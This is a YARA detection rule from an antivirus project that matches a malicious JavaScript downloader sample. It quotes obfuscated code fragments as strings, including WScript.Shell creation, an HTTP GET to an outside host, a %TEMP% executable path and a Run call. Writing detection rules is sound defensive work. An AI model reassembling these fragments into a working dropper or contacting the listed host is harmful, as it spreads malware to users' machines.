rule sig_20160328_e97f1ee3aefa2fca911dc00e51255cea {
  meta:
    description = "datamaliciousorder - file 20160328_e97f1ee3aefa2fca911dc00e51255cea.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "55f63c62250e63c85fed95d6f9ec3b6061dd3c2ae1884475f269122d38637f35"

  strings:
    $s1  = "function Gytjnn() {return Ysigjcmjc[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"hXR01F2d63.exe\";};" fullword ascii
    $s2  = "Qxvcw[Vcvjtc](\"GET\", \"http://princesse-indienne.com/m6yaf\", false);" fullword ascii
    $s3  = "do {WScript[Zlgyfzk](Grvacdko() * 11)} while (Qxvcw[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "var Ysigjcmjc = function Royzrenk() {return WScript[Sxykce](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Nnirfljarr(Wktugcmkb, Zwowk){return Wktugcmkb - Zwowk;};" fullword ascii
    $s6  = "function Txborhyr() {return ((Lhsehx == true) && (Lhsehx == Jjivhf)) ? 1 : Dxaxmol;};" fullword ascii
    $s7  = "function Lcnmlqpcq(Omkfvrgou){Ysigjcmjc[\"Run\"](Omkfvrgou, Dxaxmol, Dxaxmol);};" fullword ascii
    $s8  = "Jjivhf = true; " fullword ascii
    $s9  = "function Wttjmx(){return Sxykce;};" fullword ascii
    $s10 = " while (Kidfax){" fullword ascii
    $s11 = "var Jjivhf = false;" fullword ascii
    $s12 = "var Pzxqxzmvot = new this[\"Date\"]();" fullword ascii
    $s13 = "var Lhsehx = false;" fullword ascii
    $s14 = "return Nnirfljarr(Znzphj, Ahcvrxuv);" fullword ascii
    $s15 = "function Grvacdko(){return 22;};" fullword ascii
    $s16 = "function Vikprw(){return Jszrbsxnvj;};" fullword ascii
    $s17 = "function Izvneqa(Bncnrtogr) {var Upsvoh = (1, 2, 3, 4, 5, Bncnrtogr); return Upsvoh;};" fullword ascii
    $s18 = "function Dwlglqgfcj()" fullword ascii
    $s19 = "Lhsehx = true; " fullword ascii
    $s20 = "var Tdwbhxkvu = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}